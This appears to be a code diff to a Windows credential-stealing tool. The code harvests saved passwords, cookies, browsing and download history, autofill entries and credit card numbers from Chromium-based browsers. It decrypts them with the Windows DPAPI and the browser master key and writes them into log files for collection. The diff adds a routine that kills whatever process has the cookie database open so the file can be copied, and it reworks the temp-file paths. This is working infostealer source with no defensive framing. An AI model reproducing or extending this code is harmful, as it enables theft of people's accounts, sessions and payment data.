@@ -1,8 +1,9 @@
-from os import remove,environ, makedirs, getenv
-from os.path import join, exists, dirname
+from os import remove, environ, makedirs, kill
+from os.path import join, exists, samefile
 from glob import glob
 from base64 import b64decode
 import json
+from psutil import process_iter
 from win32crypt import CryptUnprotectData
 from manager.logger import Log
 from shutil import copy2
@@ -121,6 +122,15 @@ def decrypt_password(buff: bytes, master_key: bytes):
     decrypted_pass = decrypted_pass[:-16].decode()  
     return decrypted_pass
 
+def copy_locked(source_file, destination_file):
+    for process in process_iter():
+        open_files = process.open_files()
+        for file in open_files:
+            if samefile(file.path, source_file):
+                try: kill(process.pid)
+                except: pass
+
+    copy2(source_file, destination_file)
 
 
 def get_login_data(path, master_key, blink = False):
@@ -131,11 +141,10 @@ def get_login_data(path, master_key, blink = False):
             profile = path[num+1:]
             logins += f"===============================\n\n\n{profile}:\n\n"
         login_db = f'{path}\\Login Data'
-        copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db') 
-        conn = connect(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
+        copy2(login_db, join(environ["TEMP"], "lwincache.db"))
+        conn = connect(join(environ["TEMP"], "lwincache.db"))
         cursor = conn.cursor()
 
-    
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         for row in cursor.fetchall():
             # 0: url, 1: username, 2: encrypted_password
@@ -143,8 +152,7 @@ def get_login_data(path, master_key, blink = False):
 
             alldatapass = Types.Login(row[0], row[1], decrypted_password)
             logins += str(alldatapass) + "\n"
-        try: remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "lwincache.db"))
     except Exception as e: Log(f"{path} logins ---> {e}")
 
 def get_web_history(path, blink = False):
@@ -157,9 +165,10 @@ def get_web_history(path, blink = False):
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
         history_db = join(path, 'history')
-        copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
-        c = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\hwincache.db')
+        copy2(history_db, join(environ["TEMP"], "hwincache.db"))
+        c = connect(join(environ["TEMP"], "hwincache.db"))
         cursor = c.cursor()
+
         for result in cursor.execute(HistorySQL).fetchall():
             data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
             # 0: url, 1: title, 2: visited_time
@@ -169,8 +178,7 @@ def get_web_history(path, blink = False):
             history += result + "\n\n"
         
         c.close()
-        try: remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "hwincache.db"))
     except Exception as e:
         Log(f"{path} history ---> {e}")
 
@@ -184,8 +192,8 @@ def get_downloads(path, blink = False):
         downloads_db = f'{path}\\History'
         if not exists(downloads_db):
             return
-        copy2(downloads_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\dwincache.db')
-        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
+        copy2(downloads_db, join(environ["TEMP"], "dwincache.db"))
+        conn = connect(join(environ["TEMP"], "dwincache.db"))
         cursor = conn.cursor()
         cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
@@ -193,8 +201,7 @@ def get_downloads(path, blink = False):
             downhistory += str(Types.DownHistory(row[0], row[1])) + "\n\n"
 
         conn.close()
-        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "dwincache.db"))
     except Exception as e:
         Log(f"{path} downhistory ---> {e}")
 
@@ -209,8 +216,8 @@ def get_cookies(path, master_key, blink = False):
         cookie_db = path + '\\Network\\Cookies'
         if not exists(cookie_db):
             return None
-        copy2(cookie_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\cwincache.db')
-        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
+        copy_locked(cookie_db, join(environ["TEMP"], "cwincache.db"))
+        conn = connect(join(environ["TEMP"], "cwincache.db"))
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies ORDER BY host_key ASC")
         for row in cursor.fetchall():
@@ -224,8 +231,7 @@ def get_cookies(path, master_key, blink = False):
         cookies_list.clear()
         
         conn.close()
-        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "cwincache.db"))
     except Exception as e:
         Log(f"{path} cookies ---> {e}")
 
@@ -239,8 +245,8 @@ def get_autofils(path, blink = False):
         webdata = f'{path}\\Web Data'
         if not exists(webdata): return None
 
-        copy2(webdata, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\wwincache.db')
-        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
+        copy2(webdata, join(environ["TEMP"], "wwincache.db"))
+        conn = connect(join(environ["TEMP"], "wwincache.db"))
         cursor = conn.cursor()
         cursor.execute('SELECT name, value FROM autofill')
         for row in cursor.fetchall():
@@ -248,8 +254,7 @@ def get_autofils(path, blink = False):
             autofills += str(Types.Autofill(row[0], row[1])) + "\n\n"
 
         conn.close()
-        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "wwincache.db"))
     except Exception as e:
         Log(f"{path} autofils ---> {e}")
 
@@ -263,8 +268,8 @@ def get_credit_cards(path, master_key, blink = False):
         cards_db = f'{path}\\Web Data'
         if not exists(cards_db): return
 
-        copy2(cards_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\crwincache.db')
-        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
+        copy2(cards_db, join(environ["TEMP"], "crwincache.db"))
+        conn = connect(join(environ["TEMP"], "crwincache.db"))
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
@@ -275,8 +280,7 @@ def get_credit_cards(path, master_key, blink = False):
             cards += str(Types.CreditCard(row[0], card_number, row[1], row[2], row[4])) + "\n\n"
 
         conn.close()
-        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
-        except: pass
+        remove(join(environ["TEMP"], "crwincache.db"))
     except Exception as e:
         Log(f"{path} cards ---> {e}")
 
@@ -293,13 +297,13 @@ def Write(pathToLogs, browser):
     if logins or cookies or history or downhistory or cards or autofills:
         try:
             msgInfo+=f"\n🔍{browser}"
-            makedirs(f"{pathToLogs}\\{browser}", exist_ok=True)
+            makedirs(join(pathToLogs, browser), exist_ok=True)
             collected = True
         except: pass
 
 
     if (logins):
-        with open(rf"{pathToLogs}\\{browser}\\logins.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "logins.txt"), "w", encoding="utf-8") as f:
             f.write(logins)
         msgInfo+="\n∟🔑logins"
     
@@ -350,10 +354,10 @@ def Chromium():
     Log("===========Chromium===========")
     msgInfo+="\n<b>🌐Browsers🌐</b>"
 
-    user = environ['USERPROFILE']
-    local = getenv('LOCALAPPDATA')
-    roaming = getenv('APPDATA')
-    pathToLogs = f'{user}\\{config.pathToLogs}\\Browsers'
+    user = environ["USERPROFILE"]
+    local = environ["LOCALAPPDATA"]
+    roaming = environ["APPDATA"]
+    pathToLogs = join(user, config.pathToLogs, "Browsers")
 
     browsers = {
         'Amigo': local + '\\Amigo\\User Data',
@@ -388,7 +392,7 @@ def Chromium():
         for profile in buff:
             matching_folders.append(profile)
 
-        if (matching_folders):
+        if matching_folders:
             for profile_path in matching_folders:
                 try:
                     get_login_data(profile_path, master_key)
